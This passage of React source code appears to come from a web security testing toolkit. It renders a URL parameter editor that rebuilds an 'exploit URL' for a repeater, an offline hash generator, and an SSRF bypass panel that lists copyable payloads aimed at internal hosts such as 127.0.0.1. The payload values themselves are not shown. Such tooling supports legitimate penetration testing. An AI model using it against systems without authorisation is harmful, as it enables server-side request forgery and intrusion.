                            params: parsedUrlInfo.params.map((item, i) => i === idx ? { ...item, value: e.target.value } : item)
                          })}
                        />
                        <button
                          onClick={() => setParsedUrlInfo({
                            ...parsedUrlInfo,
                            params: parsedUrlInfo.params.filter((_, i) => i !== idx)
                          })}
                          style={{ background: 'transparent', border: 'none', color: '#ff3366', cursor: 'pointer', fontSize: 14 }}
                        >
                          🗑️
                        </button>
                      </div>
                    ))}
                    <button
                      onClick={() => setParsedUrlInfo({
                        ...parsedUrlInfo,
                        params: [...parsedUrlInfo.params, { id: String(Date.now()), key: '', value: '' }]
                      })}
                      className="add-header-btn"
                      style={{ fontSize: 10, padding: '6px 12px', width: 'max-content' }}
                    >
                      ➕ Add Parameter
                    </button>
                  </div>
                </div>
                <div className="tools-group">
                  <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: 4 }}>
                    <label className="tool-inner-label">Rebuilt Exploit URL</label>
                    <div style={{ display: 'flex', gap: 8 }}>
                      <button onClick={sendRebuiltUrlToRepeater} style={{ background: 'transparent', border: 'none', color: '#00ff88', fontSize: 10, fontWeight: 700, cursor: 'pointer' }}>↗ Send to Repeater</button>
                      <button onClick={() => handleCopy(rebuiltUrl)} className="tool-copy-trigger" style={{ fontSize: 10 }}>📋 Copy</button>
                    </div>
                  </div>
                  <textarea className="tool-textarea-readonly" style={{ height: 60, fontSize: 11 }} readOnly value={rebuiltUrl} />
                </div>
              </div>
            )}

            {/* --- CRYPTO HASH WORKSPACE --- */}
            {activeTool === 'crypto' && (
              <div className="crypto-tool" style={{ display: 'flex', flexDirection: 'column', gap: 12, maxWidth: 800, margin: '0 auto' }}>
                <div className="tools-group">
                  <label className="tool-inner-label">Input String</label>
                  <textarea className="tool-textarea" style={{ height: 120 }} value={hashInput} onChange={e => setHashInput(e.target.value)} placeholder="Type text to generate hashes offline..." />
                </div>
                <div style={{ display: 'flex', flexDirection: 'column', gap: 10 }}>
                  {([
                    { name: 'MD5', val: hashes.md5Val },
                    { name: 'SHA-1', val: hashes.sha1Val },
                    { name: 'SHA-256', val: hashes.sha256Val },
                    { name: 'SHA-512', val: hashes.sha512Val }
                  ]).map(h => (
                    <div key={h.name} style={{ background: 'var(--bg-primary)', border: '1px solid var(--border-primary)', borderRadius: 6, padding: 10 }}>
                      <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: 4 }}>
                        <span style={{ fontSize: 10, fontWeight: 700, color: 'var(--text-secondary)' }}>{h.name}</span>
                        {h.val && <button onClick={() => handleCopy(h.val)} className="tool-copy-trigger" style={{ fontSize: 9 }}>Copy Hash</button>}
                      </div>
                      <div style={{ fontSize: 10, fontFamily: 'monospace', wordBreak: 'break-all', color: 'var(--accent-cyan)' }}>
                        {h.val || '(waiting for input)'}
                      </div>
                    </div>
                  ))}
                </div>
              </div>
            )}

            {/* --- SSRF BYPASS WORKSPACE --- */}
            {activeTool === 'ssrf' && (
              <div className="ssrf-tool" style={{ display: 'flex', flexDirection: 'column', gap: 12, maxWidth: 800, margin: '0 auto' }}>
                <div className="tools-group">
                  <label className="tool-inner-label">Target Internal Host / IP</label>
                  <input type="text" className="tool-input-field" value={ssrfInput} onChange={e => setSsrfInput(e.target.value)} placeholder="e.g. 127.0.0.1 or localhost" />
                </div>
                <div style={{ display: 'flex', flexDirection: 'column', gap: 8 }}>
                  {ssrfBypasses.map((b, idx) => (
                    <div key={idx} style={{ background: 'var(--bg-primary)', border: '1px solid var(--border-primary)', borderRadius: 6, padding: 8 }}>
                      <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: 4 }}>
                        <span style={{ fontSize: 10, fontWeight: 700, color: 'var(--text-muted)' }}>{b.label}</span>
                        <button onClick={() => handleCopy(b.payload)} className="tool-copy-trigger" style={{ fontSize: 9 }}>Copy Payload</button>
                      </div>
                      <div style={{ fontSize: 11, fontFamily: 'monospace', color: '#ff3366', wordBreak: 'break-all' }}>{b.payload}</div>
                    </div>
                  ))}
                </div>
              </div>
            )}

          </div>
        </div>
      )}

    </div>
  );
}
